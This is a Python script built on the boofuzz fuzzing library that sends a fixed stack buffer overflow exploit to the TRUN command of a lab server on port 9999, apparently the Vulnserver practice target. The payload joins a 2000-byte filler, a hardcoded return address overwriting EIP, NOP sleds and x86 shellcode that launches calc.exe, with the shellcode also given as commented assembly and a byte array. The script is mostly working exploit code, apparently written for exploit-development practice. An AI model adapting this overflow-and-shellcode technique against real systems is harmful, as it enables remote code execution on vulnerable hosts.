from boofuzz import *

def check_response(target, fuzz_data_logger, session, *args, **kwargs):
	fuzz_data_logger.log_info("Checking test case response...")
	try:
		response = target.recv(512)
	except:
		fuzz_data_logger.log_fail("Unable to connect to target. Closing...")
		target.close()
		exit(-1)
		return

	#if empty response
	if not response:
		fuzz_data_logger.log_fail("Empty response, target may be hung. Closing...")
		target.close()
		return

	fuzz_data_logger.log_info("response check...\n" + str(response))
	target.close()
	return

def ping_server(target, fuzz_data_logger, session, *args, **kwargs):
	target.open()
	#send target a check command
	target.send(b"TRUN 1234")
	try:
		response = target.recv(512)
	except:
		fuzz_data_logger.log_fail("Unable to connect to target. Closing...")
		target.close()
		exit(-1)
		return

	#if empty response
	if not response:
		fuzz_data_logger.log_fail("Empty response, target may be hung. Closing...")
		return

	fuzz_data_logger.log_info("Response looks good.")
	return
	
#shellcode
# .386
    # .model flat,stdcall
    # option casemap:none

# include     windows.inc
# include     user32.inc
# includelib  user32.lib
# include     kernel32.inc
# includelib  kernel32.lib

    # .code
# start:
    # ;push ebp
    # ;mov ebp,esp

    # ;LoadLibrary("kernel32.dll");
    # ;xor eax,eax
    # ;push eax
    # ;mov eax,6C6C642Eh   ;".dll"
    # ;push eax
    # ;mov eax,32336C65h   ;"el32"
    # ;push eax
    # ;mov eax,6E72656Bh   ;"kern"
    # ;push eax
    # ;mov eax,esp
    # ;push eax            ;Arg1 = "kernel32.dll"
    # ;mov eax,7C801D7Bh   ;kernel32.LoadLibrary
    # ;call eax

    # ;WinExec("calc.exe", 5);
    # xor eax,eax
    # push eax
    # mov eax,6578652Eh   ;".exe"
    # push eax
    # mov eax,636C6163h   ;"calc"
    # push eax
    # mov eax,esp
    # push 5              ;Arg2 = SW_SHOW
    # push eax            ;Arg1 = "calc.exe"
    # mov eax,7C8623ADh   ;kernel32.WinExec
    # call eax

    # ;ExitProcess(0);
    # xor eax,eax
    # push eax            ;Arg1 = 0
    # mov eax,7C81CAFAh   ;kernel32.ExitProcess
    # call eax

    # ;mov esp,ebp
    # ;pop ebp
# end start

# unsigned char shellcode[68] = {
    # 0x33, 0xC0, 0x50, 0xB8, 0x2E, 0x64, 0x6C, 0x6C,
    # 0x50, 0xB8, 0x65, 0x6C, 0x33, 0x32, 0x50, 0xB8,
    # 0x6B, 0x65, 0x72, 0x6E, 0x50, 0x8B, 0xC4, 0x50,
    # 0xB8, 0x7B, 0x1D, 0x80, 0x7C, 0xFF, 0xD0, 0x33,
    # 0xC0, 0x50, 0xB8, 0x2E, 0x65, 0x78, 0x65, 0x50,
    # 0xB8, 0x63, 0x61, 0x6C, 0x63, 0x50, 0x8B, 0xC4,
    # 0x6A, 0x05, 0x50, 0xB8, 0xAD, 0x23, 0x86, 0x7C,
    # 0xFF, 0xD0, 0x33, 0xC0, 0x50, 0xB8, 0xFA, 0xCA,
    # 0x81, 0x7C, 0xFF, 0xD0
# };

def test_static():
	tcp_target = Target(connection=TCPSocketConnection(host='192.168.91.133', port=9999))
	session = Session(target=tcp_target,post_test_case_callbacks=[check_response, ping_server],
		crash_threshold_element=20,
		crash_threshold_request=60)

	s_initialize("Request") 
	with s_block("Request-1"):
		#s_group("CMD", ['STATS', 'RTIME', 'LTIME', 'SRUN', 'TRUN', 'GMON', 'GDOG','KSTET','GTER','HTER','LTER','KSTAN'])
		s_static("TRUN")
		s_delim(" ",False)
		payload="/:./"
		fillblock='A'*2000;
		fillblock=fillblock+"\xee\xff\xee"
		ret_ip="\x5b\x4e\xD3\x77"	#return addr，to eip
		nop_pre_block='\x90'*0x50;
		shellcode="\x33\xC0\x50\xB8\x2E\x64\x6C\x6C\x50\xB8\x65\x6C\x33\x32\x50\xB8\x6B\x65\x72\x6E\x50\x8B\xC4\x50\xB8\x5c\x39\xe3\x77\xFF\xD0\x33\xC0\x50\xB8\x2E\x65\x78\x65\x50\xB8\x63\x61\x6C\x63\x50\x8B\xC4\x6A\x05\x50\xB8\xfD\xe5\xe6\x77\xFF\xD0\x33\xC0\x50\xB8\xFA\xCA\x81\x7C\xFF\xD0";
		nop_back_block='\x90'*0x50;
		
		payload=payload+fillblock+ret_ip+nop_pre_block+shellcode+nop_back_block;
		s_static(payload)
		
	tcp_target.open();
	tcp_target.send(s_render());
	data=tcp_target.recv()
	tcp_target.close();

def main():
	test_static();

if __name__ == "__main__":
	main()